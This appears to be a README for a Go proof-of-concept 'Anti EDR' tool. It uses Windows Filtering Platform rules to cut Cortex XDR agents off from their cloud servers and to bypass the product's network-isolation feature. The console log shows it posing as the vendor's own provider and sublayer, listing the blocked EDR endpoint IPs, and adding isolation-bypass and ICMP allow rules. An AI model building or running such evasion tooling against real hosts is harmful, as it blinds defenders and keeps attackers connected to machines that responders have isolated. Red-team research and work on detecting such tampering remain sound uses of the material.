# WFP_experiments

cd WFP_experiments  
go mod init wfp_edr
go get inet.af/wf  
  
go run wfp_edr.go  
go build wfp_edr.go  


# in action  


```
C:\Temp\hello>wfp_edr.exe xdr.json
[+] Starting Anti EDR with WFP filters
[+] Config file parsed
[+] Created new Session name = 'EDR Offensive tool POC WITH wfp'
[+] Adding Provider name = ' Palo Alto Networks Corporation - Cortex XDR Network Isolation ' providerID =  {4544A023-2767-411C-86E4-3EA52A4AA172}  Persistent = false
[+] Adding sublayer guid =  {849BDEF4-C2D5-4464-96E8-3CBE11841AD6}  name =  Palo Alto Networks Corporation - Cortex XDR Network Isolation  Isolation weight 0xffff
  [+] Name: Live-EU, IP: 35.244.251.25
  [+] Name: Live-CH, IP: 34.65.213.226
  [+] Name: Live-DE, IP: 34.107.61.141
  [+] Name: Live-US, IP: 35.190.88.43
  [+] Name: Live-CA, IP: 35.203.99.74
  [+] Name: Live-UK, IP: 35.242.159.176
  [+] Name: Live-JP, IP: 34.84.201.32
  [+] Name: Live-SG, IP: 34.87.61.186
  [+] Name: Live-AU, IP: 35.244.66.177
  [+] Name: Live-IN, IP: 35.200.146.253
  [+] Name: Live-PL, IP: 34.118.62.80
  [+] Name: EDR-EU, IP: 34.102.140.103
  [+] Name: EDR-CH, IP: 34.149.180.250
  [+] Name: EDR-DE, IP: 34.107.161.143
  [+] Name: EDR-US, IP: 34.98.77.231
  [+] Name: EDR-CA, IP: 34.96.120.25
  [+] Name: EDR-UK, IP: 35.244.133.254
  [+] Name: EDR-JP, IP: 34.95.66.187
  [+] Name: EDR-SG, IP: 34.120.142.18
  [+] Name: EDR-AU, IP: 34.102.237.151
  [+] Name: EDR-IN, IP: 34.120.213.187
  [+] Name: EDR-PL, IP: 35.190.13.237
[+] Adding WFP rule to block EDR flow guid =  {6EA947C4-D7A5-45A4-B2EE-38A5AE7008D9}  name = 'EDR_BLOCKING_RULE' for layer =  ALE_AUTH_CONNECT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {A7529E82-28EE-49EB-9516-EB2DFB70D2FD}  name = 'EDR_Isolate_bypass_RULE' for layer =  ALE_AUTH_RECV_ACCEPT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {66B9EF66-CBFB-4FEC-8A78-D93309ABC757}  name = 'EDR_Isolate_bypass_RULE' for layer =  ALE_AUTH_CONNECT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {ECD87A1D-7A23-4796-823C-0C67D1593180}  name = 'EDR_Isolate_bypass_RULE' for layer =  OUTBOUND_TRANSPORT_V4
[+] Adding WFP rule to Allow ANY ICMPv4 guid =  {CF7D78D3-BCAA-43BF-88DD-35FF57FC9FD9}  name = 'EDR_Isolate_bypass_ICMP_RULE' for layer =  OUTBOUND_ICMP_ERROR_V4
[+] Adding WFP rule to Allow ANY ICMPv4 guid =  {0D451894-9333-4616-8524-7BEA4555953A}  name = 'EDR_Isolate_bypass_ICMP_RULE' for layer =  INBOUND_ICMP_ERROR_V4
==> Press ENTER to finish and remove tempory WFP rules...

[+] Finished

```
